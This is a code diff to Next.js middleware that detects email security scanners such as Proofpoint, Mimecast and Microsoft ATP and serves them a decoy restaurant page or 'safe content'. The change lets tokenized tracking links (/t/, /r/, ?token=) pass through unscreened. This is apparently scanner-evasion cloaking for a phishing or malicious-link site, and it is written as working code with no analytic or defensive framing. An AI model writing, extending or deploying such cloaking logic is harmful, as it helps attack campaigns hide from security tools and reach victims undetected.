@@ -250,20 +250,37 @@ if (!ADMIN_PASSWORD) {
   
   const referrer = request.headers.get('referer') || request.headers.get('referrer') || ''
 
-  const forceBenignTemplate =
-    process.env.NODE_ENV === 'development' &&
-    /proofpoint|mimecast|curl|microsoft office 365 advanced threat protection/i.test(userAgent)
+  // BYPASS: Allow token links to bypass scanner detection
+  // Token links are legitimate user links and should not be blocked by scanner detection
+  const searchParamsForScanner = request.nextUrl.searchParams
+  const hasTokenForScanner = searchParamsForScanner.has('token') || pathname.includes('/t/') || pathname.includes('/r/')
+  const isTokenLinkForScanner = hasTokenForScanner && (pathname === '/' || pathname.startsWith('/t/') || pathname.startsWith('/r/'))
+  
+  if (isTokenLinkForScanner) {
+    // Token links bypass scanner detection - they're legitimate user links
+    // Token validation happens later in the page/API flow
+    if (process.env.NODE_ENV === 'development') {
+      console.log('[TOKEN-LINK-BYPASS] Allowing token link through scanner detection:', {
+        path: pathname + search,
+        hasToken: searchParamsForScanner.has('token'),
+      })
+    }
+  } else {
+    // Only run scanner detection for non-token links
+    const forceBenignTemplate =
+      process.env.NODE_ENV === 'development' &&
+      /proofpoint|mimecast|curl|microsoft office 365 advanced threat protection/i.test(userAgent)
 
-  if (forceBenignTemplate) {
-    const forcedTemplateUrl = new URL('/benign-templates/restaurant/index.html', request.url)
-    console.log('[BENIGN-TEST-MODE] Forcing restaurant template for UA:', userAgent.substring(0, 80))
-    return NextResponse.rewrite(forcedTemplateUrl)
-  }
+    if (forceBenignTemplate) {
+      const forcedTemplateUrl = new URL('/benign-templates/restaurant/index.html', request.url)
+      console.log('[BENIGN-TEST-MODE] Forcing restaurant template for UA:', userAgent.substring(0, 80))
+      return NextResponse.rewrite(forcedTemplateUrl)
+    }
 
-  const detectionHeaders = serializeHeaders(request.headers)
-  try {
-    const scannerDetection = await classifyRequest(userAgent, ip, detectionHeaders)
-    if (scannerDetection.isScanner) {
+    const detectionHeaders = serializeHeaders(request.headers)
+    try {
+      const scannerDetection = await classifyRequest(userAgent, ip, detectionHeaders)
+      if (scannerDetection.isScanner) {
       if (isLocalhost && process.env.NODE_ENV === 'development') {
         console.warn('[Middleware] Scanner detected but running in localhost test mode; skipping safe-content rewrite.')
       } else {
@@ -289,9 +306,10 @@ if (!ADMIN_PASSWORD) {
       return NextResponse.rewrite(safeContentUrl)
       }
     }
-  } catch (error) {
-    if (process.env.NODE_ENV === 'development') {
-      console.warn('[Middleware] Scanner detection failed:', error)
+    } catch (error) {
+      if (process.env.NODE_ENV === 'development') {
+        console.warn('[Middleware] Scanner detection failed:', error)
+      }
     }
   }
 
